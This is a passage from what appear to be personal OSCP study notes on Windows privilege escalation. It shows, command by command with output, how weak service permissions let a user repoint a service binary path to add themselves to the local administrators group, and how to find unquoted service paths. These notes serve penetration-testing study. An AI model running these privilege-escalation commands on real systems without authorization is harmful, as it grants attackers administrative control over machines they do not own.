  PathName         : &#34;C:\Program Files (x86)\Windscribe\WindscribeService.exe&#34;</code></pre></div><p>Â </p><p>Â </p><h4 id=checking-permissions-with-accesschk>Checking Permissions with AccessChk</h4><p>Next, we&rsquo;ll use <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk rel=external>AccessChk</a> from the Sysinternals suite to enumerate permissions on the service. The flags we use, in order, are <code>-q</code> (omit banner), <code>-u</code> (suppress errors), <code>-v</code> (verbose), <code>-c</code> (specify name of a Windows service), and <code>-w</code> (show only objects that have write access). Here we can see that all Authenticated Users have <a href=https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights rel=external>SERVICE_ALL_ACCESS</a> rights over the service, which means full read/write control over it.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; accesschk.exe /accepteula -quvcw WindscribeService
 
Accesschk v6.13 - Reports effective permissions for securable objects
Copyright âŒ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com
 
WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\Authenticated Users
        SERVICE_ALL_ACCESS</code></pre></div><p>Â </p><p>Â </p><h4 id=changing-the-service-binary-path>Changing the Service Binary Path</h4><p>We can use our permissions to change the binary path maliciously. Let&rsquo;s change it to add our user to the local administrator group. We could set the binary path to run any command or executable of our choosing (such as a reverse shell binary).</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc config WindscribeService binpath=&#34;cmd /c net localgroup administrators local-student /add&#34;

[SC] ChangeServiceConfig SUCCESS</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h4 id=stopping-service>Stopping Service</h4><p>Next, we must stop the service, so the new <code>binpath</code> command will run the next time it is started.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc stop WindscribeService
 
SERVICE_NAME: WindscribeService
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 3  STOP_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x4
        WAIT_HINT          : 0x0</code></pre></div><h4 id=starting-the-service-1>Starting the Service</h4><p>Since we have full control over the service, we can start it again, and the command we placed in the <code>binpath</code> will run even though an error message is returned. The service fails to start because the <code>binpath</code> is not pointing to the actual service executable. Still, the executable will run when the system attempts to start the service before erroring out and stopping the service again, executing whatever command we specify in the <code>binpath</code>.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc start WindscribeService

[SC] StartService FAILED 1053:
 
The service did not respond to the start or control request in a timely fashion.</code></pre></div><h4 id=confirming-local-admin-group-addition>Confirming Local Admin Group Addition</h4><p>Finally, check to confirm that our user was added to the local administrators group.</p><p>Weak Permissions</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; net localgroup administrators

Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain
 
Members
 
-------------------------------------------------------------------------------
Administrator
local-student
mrb3n
The command completed successfully.</code></pre></div><p>Â </p><p>Â </p><p>Â </p><h2 id=unquoted-service-path>Unquoted Service Path</h2><h4 id=service-binary-path>Service Binary Path</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell-session data-lang=shell-session><span style=display:flex><span>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
</span></span></code></pre></div><p>Windows will decide the execution method of a program based on its file extension, so it&rsquo;s not necessary to specify it. Windows will attempt to load the following potential executables in order on service start, with a .exe being implied:</p><ul><li><code>C:\Program</code></li><li><code>C:\Program Files</code></li><li><code>C:\Program Files (x86)\System</code></li><li><code>C:\Program Files (x86)\System Explorer\service\SystemExplorerService64</code></li></ul><p>Â </p><h4 id=searching-for-unquoted-service-paths>Searching for Unquoted Service Paths</h4><p>We can identify unquoted service binary paths using the command below.</p><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; wmic service get name,displayname,pathname,startmode |findstr /i &#34;auto&#34; | findstr /i /v &#34;c:\windows\\&#34; | findstr /i /v &#34;&#34;&#34;
GVFS.Service                                                                        GVFS.Service                              C:\Program Files\GVFS\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\Program Files (x86)\Windscribe\WindscribeService.exe                                  Auto</code></pre></div><p>Â </p><h4 id=querying-service>Querying Service</h4><div class="highlight wrap-code" dir=auto><pre tabindex=0><code class=language-cmd-session data-lang=cmd-session>C:\local&gt; sc qc SystemExplorerHelpService

[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: SystemExplorerHelpService
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\Program Files (x86)\System Explorer\service\SystemExplorerService64.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Explorer Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem</code></pre></div><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><p>Â </p><footer class=footline></footer></article></div></main></div><aside id=R-sidebar class=default-animation><div id=R-header-topbar class=default-animation></div><div id=R-header-wrapper class=default-animation><div id=R-header class=default-animation><a id=R-logo class=R-default href=../../><div class=logo-title style=display:flex;align-items:center><img src=../../images/logo.png alt=Logo style=width:90px;height:80>
<span>DrakonOps</span></div></a></div><search><form action=../../search/index.html method=get><div class="searchbox default-animation"><button class=search-detail type=submit title="Search (CTRL+ALT+f)"><i class="fas fa-search"></i></button>
<label class=a11y-only for=R-search-by>Search</label>
<input data-search-input id=R-search-by name=search-by class=search-by type=search placeholder=Search...>
<button class=search-clear type=button data-search-clear title="Clear search"><i class="fas fa-times" title="Clear search"></i></button></div></form></search></div><div id=R-homelinks class="default-animation homelinks"><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-homelinks"><ul class="space collapsible-menu"><li data-nav-url=../../index.html><a class=padding href=../../index.html><i class="fa-fw fas fa-home"></i> Home</a></li></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-headercontrols"><ul></ul></div><div class="R-menu-divider default-animation"><hr class=padding></div></div><div id=R-content-wrapper class=highlightable><div class="R-sidebarmenu R-shortcutmenu-main"><ul class="enlarge morespace collapsible-menu"><li class=parent data-nav-url=../../oscp-notes/index.html><input type=checkbox id=R-section-5f51e3ac21bcc264f305c28eac7484ea aria-controls=R-subsections-5f51e3ac21bcc264f305c28eac7484ea checked><label for=R-section-5f51e3ac21bcc264f305c28eac7484ea><i class="fa-fw fas fa-chevron-right"></i><span class=a11y-only>Submenu OSCP Notes</span></label><a class=padding href=../../oscp-notes/index.html>OSCP Notes<i class="fa-fw fas fa-check read-icon"></i></a><ul id=R-subsections-5f51e3ac21bcc264f305c28eac7484ea class=collapsible-menu><li data-nav-url=../../oscp-notes/main-methodology/index.html><a class=padding href=../../oscp-notes/main-methodology/index.html>main methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/methodology/index.html><a class=padding href=../../oscp-notes/methodology/index.html>methodology<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/project/index.html><a class=padding href=../../oscp-notes/project/index.html>project<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html><a class=padding href=../../oscp-notes/footprinting-and-finger-printing-web-apps/index.html>footprinting and finger printing web apps<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nmap/index.html><a class=padding href=../../oscp-notes/nmap/index.html>nmap<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/go-busters/index.html><a class=padding href=../../oscp-notes/go-busters/index.html>Go busters<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/dns/index.html><a class=padding href=../../oscp-notes/dns/index.html>dns<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smb/index.html><a class=padding href=../../oscp-notes/smb/index.html>smb<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/nfs/index.html><a class=padding href=../../oscp-notes/nfs/index.html>nfs<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ftp/index.html><a class=padding href=../../oscp-notes/ftp/index.html>ftp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/smtp/index.html><a class=padding href=../../oscp-notes/smtp/index.html>smtp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/snmp/index.html><a class=padding href=../../oscp-notes/snmp/index.html>snmp<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/imap-and-pop/index.html><a class=padding href=../../oscp-notes/imap-and-pop/index.html>imap and pop<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/mssql/index.html><a class=padding href=../../oscp-notes/mssql/index.html>mssql<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/oracle-databases-tns/index.html><a class=padding href=../../oscp-notes/oracle-databases-tns/index.html>oracle databases TNS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/ipmi/index.html><a class=padding href=../../oscp-notes/ipmi/index.html>IPMI<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/vhosts/index.html><a class=padding href=../../oscp-notes/vhosts/index.html>vhosts<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/web-attacks/index.html><a class=padding href=../../oscp-notes/web-attacks/index.html>Web Attacks<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/xss/index.html><a class=padding href=../../oscp-notes/xss/index.html>XSS<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/login-brute-force-wordlists/index.html><a class=padding href=../../oscp-notes/login-brute-force-wordlists/index.html>login brute force wordlists<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/crackmapexec/index.html><a class=padding href=../../oscp-notes/crackmapexec/index.html>crackmapexec<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/eum4linux/index.html><a class=padding href=../../oscp-notes/eum4linux/index.html>eum4linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rpcclient/index.html><a class=padding href=../../oscp-notes/rpcclient/index.html>rpcclient<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/spwaning-shell/index.html><a class=padding href=../../oscp-notes/spwaning-shell/index.html>spwaning shell<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-windows/index.html><a class=padding href=../../oscp-notes/file-transfers-windows/index.html>File transfers windows<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html><a class=padding href=../../oscp-notes/file-transfer-using-nc_ncat-and-rdp_winrm/index.html>file transfer using nc_ncat and rdp_winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/living-off-the-land-file-transfer/index.html><a class=padding href=../../oscp-notes/living-off-the-land-file-transfer/index.html>living off the land file transfer<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/transferring-files-with-code/index.html><a class=padding href=../../oscp-notes/transferring-files-with-code/index.html>Transferring Files with Code<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/privilige-escalation/index.html><a class=padding href=../../oscp-notes/privilige-escalation/index.html>privilige escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-privilege-escalation/index.html><a class=padding href=../../oscp-notes/linux-privilege-escalation/index.html>linux privilege escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li class=active data-nav-url=../../oscp-notes/windows-privilege-escalation/index.html><a class=padding href=../../oscp-notes/windows-privilege-escalation/index.html>Windows Privilege Escalation<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/pivoting_tunneling/index.html><a class=padding href=../../oscp-notes/pivoting_tunneling/index.html>Scanning the Pivot Target<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-active-directory/index.html><a class=padding href=../../oscp-notes/the-active-directory/index.html>The Active Directory<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/the-metasploit-framework/index.html><a class=padding href=../../oscp-notes/the-metasploit-framework/index.html>The Metasploit Framework<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/linux-remote-management/index.html><a class=padding href=../../oscp-notes/linux-remote-management/index.html>Linux Remote Management<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/rdp-and-windows-remote-management/index.html><a class=padding href=../../oscp-notes/rdp-and-windows-remote-management/index.html>RDP and winrm<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/file-transfers-linux/index.html><a class=padding href=../../oscp-notes/file-transfers-linux/index.html>File transfers Linux<i class="fa-fw fas fa-check read-icon"></i></a></li><li data-nav-url=../../oscp-notes/password-attacks/index.html><a class=padding href=../../oscp-notes/password-attacks/index.html>password attacks<i class="fa-fw fas fa-check read-icon"></i></a></li></ul></li></ul></div><div class="R-sidebarmenu R-shortcutmenu-shortcuts"><ul class="space collapsible-menu"></ul></div><div id=R-footer-margin></div><div class="R-menu-divider default-animation"><hr class=padding></div><div class="R-sidebarmenu R-shortcutmenu-footercontrols"><ul><li class=R-historyclearer><div class="padding menu-control"><i class="fa-fw fas fa-history"></i>
<span>&nbsp;</span><div class=control-style><button>Clear History</button></div><div class=clear></div></div></li></ul></div><div id=R-footer><p>Built with <a href=https://github.com/McShelby/hugo-theme-relearn title=love><i class="fas fa-heart"></i></a> by <a href=https://gohugo.io/>Hugo</a></p></div></div></aside><script src=../../js/js-yaml/js-yaml.min.js?1762046208 defer></script><script src=../../js/d3/d3-color.min.js?1762046208 defer></script><script src=../../js/d3/d3-dispatch.min.js?1762046208 defer></script><script src=../../js/d3/d3-drag.min.js?1762046208 defer></script><script src=../../js/d3/d3-ease.min.js?1762046208 defer></script><script src=../../js/d3/d3-interpolate.min.js?1762046208 defer></script><script src=../../js/d3/d3-selection.min.js?1762046208 defer></script><script src=../../js/d3/d3-timer.min.js?1762046208 defer></script><script src=../../js/d3/d3-transition.min.js?1762046208 defer></script><script src=../../js/d3/d3-zoom.min.js?1762046208 defer></script><script src=../../js/mermaid/mermaid.min.js?1762046208 defer></script><script>window.relearn.themeUseMermaid=JSON.parse("{}")</script><script src=../../js/clipboard/clipboard.min.js?1762046208 defer></script><script src=../../js/perfect-scrollbar/perfect-scrollbar.min.js?1762046208 defer></script><script src=../../js/theme.min.js?1762046208 defer></script></body></html>